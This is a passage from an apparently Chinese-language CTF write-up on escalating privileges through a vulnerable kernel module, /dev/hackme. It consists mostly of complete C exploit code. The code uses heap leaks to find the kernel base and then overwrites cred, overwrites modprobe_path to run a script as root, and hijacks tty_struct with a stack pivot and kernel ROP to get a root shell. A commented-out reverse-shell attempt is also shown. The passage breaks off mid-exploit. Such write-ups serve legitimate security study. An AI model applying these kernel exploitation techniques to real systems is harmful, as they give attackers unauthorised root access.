&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">size_t</span>*)buf = cred_addr;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">1</span>) = <span class="number">28</span>;</span><br><span class="line">    uwrite(fd,<span class="number">3</span>,buf,<span class="number">0x10</span>,<span class="number">0</span>);</span><br><span class="line">    memset(buf,'\x00',28);</span><br><span class="line">    uwrite(fd,<span class="number">4</span>,buf,<span class="number">28</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Not root..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="其他解法一："><a href="#其他解法一：" class="headerlink" title="其他解法一："></a>其他解法一：</h2><h3 id="modprobe-path"><a href="#modprobe-path" class="headerlink" title="modprobe_path"></a>modprobe_path</h3><p>这是一个类似于<code>poweroff_cmd</code>的全局变量，会被<code>call_userhelpermode</code>当做第一个参数调用，原本内容为：<code>/sbin/modprobe</code>，更改为我们自己的命令即可，触发条件为执行一个非正确格式的<code>ELF</code>文件。</p>
<p>我这里还尝试了直接运行<code>/bin/sh</code>，结果是失败的，不知道为什么，但是之前改<code>poweroff_cmd</code>时改为<code>/bin/sh</code>同样是失败的，可能只能运行一个命令没法交互吧，还尝试了<code>反弹shell</code>，但是因为文件系统中没有初始化网络相关设备，所以也失败了，结果如下图：</p>
<p><img src="https://i.loli.net/2020/02/13/7OfceoKrqnEWzgp.png" alt="x1.PNG"></p>
<h2 id="exp：-11"><a href="#exp：-11" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> index;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>* <span class="title">user_chunk</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uread</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30003</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uwrite</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/hackme"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[:(]Open error...\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    user_chunk = (struct chunk*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct chunk));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'0'</span>,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'1'</span>,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">1</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'2'</span>,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">2</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    uread(fd,<span class="number">0</span>,buf,<span class="number">0x200</span>,<span class="number">-0x200</span>);</span><br><span class="line">    <span class="keyword">size_t</span> kernel_base = *((<span class="keyword">size_t</span>*)buf+<span class="number">5</span>) - <span class="number">0x849ae0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]kernel_base = %p\n"</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd,<span class="number">0</span>,buf,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span>(fd,<span class="number">1</span>,buf,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    uread(fd,<span class="number">2</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">    <span class="keyword">size_t</span> heap_base = *(<span class="keyword">size_t</span>*)buf - <span class="number">0x17a500</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]heap_base = %p\n"</span>,heap_base);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf = kernel_base + <span class="number">0x811040</span>;</span><br><span class="line">    uwrite(fd,<span class="number">2</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line"></span><br><span class="line">    memset(buf,'\x00',0x100);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">1</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    uread(fd,<span class="number">1</span>,buf,<span class="number">0x20</span>,<span class="number">-0x20</span>);</span><br><span class="line">    <span class="keyword">size_t</span> mod_base = *(<span class="keyword">size_t</span>*)buf - <span class="number">0x6000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]mod_base = %p\n"</span>,mod_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd,<span class="number">0</span>,buf,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">size_t</span>*)buf = mod_base+<span class="number">0x2440</span>;</span><br><span class="line">    uwrite(fd,<span class="number">2</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line"></span><br><span class="line">    memset(buf,'\x00',0x100);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">3</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ffffffff8183f960 D modprobe_path 81</span></span><br><span class="line">    <span class="keyword">size_t</span> modprobe_path = kernel_base + <span class="number">0x83f960</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]modprobe_path_addr = %p\n"</span>,modprobe_path); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//直接cat /flag成功</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)buf = modprobe_path;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">1</span>) = <span class="built_in">strlen</span>(<span class="string">"/home/pwn/xxrw.sh"</span>)+<span class="number">1</span>;</span><br><span class="line">    uwrite(fd,<span class="number">3</span>,buf,<span class="number">0x10</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    memset(buf,'\x00',0x1000);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf,<span class="string">"/home/pwn/xxrw.sh"</span>);</span><br><span class="line">    uwrite(fd,<span class="number">4</span>,buf,<span class="built_in">strlen</span>(buf)+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' &gt; /home/pwn/xxrw.sh"</span>);</span><br><span class="line">    system(<span class="string">"/bin/chmod +x /home/pwn/xxrw.sh"</span>);</span><br><span class="line">    system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /trigger"</span>);</span><br><span class="line">    system(<span class="string">"/bin/chmod +x /trigger"</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"/trigger"</span>);</span><br><span class="line">    system(<span class="string">"cat /flag"</span>);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    反弹shell失败</span></span><br><span class="line"><span class="comment">    *(size_t*)buf = modprobe_path;</span></span><br><span class="line"><span class="comment">    *((size_t*)buf+1) = strlen("/reverse")+1;</span></span><br><span class="line"><span class="comment">    uwrite(fd,3,buf,0x10,0);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    memset(buf,'\x00',0x1000);</span></span><br><span class="line"><span class="comment">    strcpy(buf,"/reverse");</span></span><br><span class="line"><span class="comment">    uwrite(fd,4,buf,strlen(buf)+1,0);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    system("echo -ne '\\xff\\xff\\xff\\xff' &gt; /trigger");</span></span><br><span class="line"><span class="comment">    system("/bin/chmod +x /trigger");</span></span><br><span class="line"><span class="comment">    if(fork() == 0)&#123;</span></span><br><span class="line"><span class="comment">        system("/trigger");</span></span><br><span class="line"><span class="comment">        exit(0);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    system("nc -lp 2333");</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/13/GAHEw85QxuI79CU.png" alt="x1.PNG"></p>
<hr>
<h2 id="其他解法二："><a href="#其他解法二：" class="headerlink" title="其他解法二："></a>其他解法二：</h2><h3 id="tty-struct-amp-amp-栈迁移："><a href="#tty-struct-amp-amp-栈迁移：" class="headerlink" title="tty_struct &amp;&amp; 栈迁移："></a>tty_struct &amp;&amp; 栈迁移：</h3><p>修改<code>tty_struct</code>的<code>ops</code>指针原先存有内核基址，可利用其来泄露内核基址，然后将其改为内核堆中的可控地址，也就是我们申请到的chunk的地址，然后在那个地址构造<code>fake_tty_operation</code>，劫持<code>write</code>函数即可。栈迁移用到的<code>gadget</code>为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81200F66                 mov     rsp, rax</span><br><span class="line">.text:FFFFFFFF81200F69                 jmp     loc_FFFFFFFF81200EE7</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81200EE7                 pop     r12</span><br><span class="line">.text:FFFFFFFF81200EE9                 mov     rdi, rsp</span><br><span class="line">.text:FFFFFFFF81200EEC                 call    sub_FFFFFFFF81016190</span><br><span class="line">.text:FFFFFFFF81200EF1                 mov     rsp, rax</span><br><span class="line">.text:FFFFFFFF81200EF4                 lea     rbp, [rsp+70h+var_6F]</span><br><span class="line">.text:FFFFFFFF81200EF9                 push    r12</span><br><span class="line">.text:FFFFFFFF81200EFB                 retn</span><br></pre></td></tr></table></figure>
<p>需要注意的是因为开启了<code>smap</code>，内核态无法访问用户空间数据，所以<code>ropchain</code>需要放在内核内存中，我们这里正好放在申请到的堆块中。</p>
<h2 id="exp：-12"><a href="#exp：-12" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> index;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>* <span class="title">user_chunk</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uread</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30003</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uwrite</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> get_shell_addr = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Not root..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rsp,user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">        <span class="string">"mov user_rsp,rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Save success!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">su</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"push user_ss;"</span></span><br><span class="line">        <span class="string">"push user_rsp;"</span></span><br><span class="line">        <span class="string">"push user_rflags;"</span></span><br><span class="line">        <span class="string">"push user_cs;"</span></span><br><span class="line">        <span class="string">"push get_shell_addr;"</span></span><br><span class="line">        <span class="string">"swapgs;"</span></span><br><span class="line">        <span class="string">"iretq;"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/hackme"</span>,<span 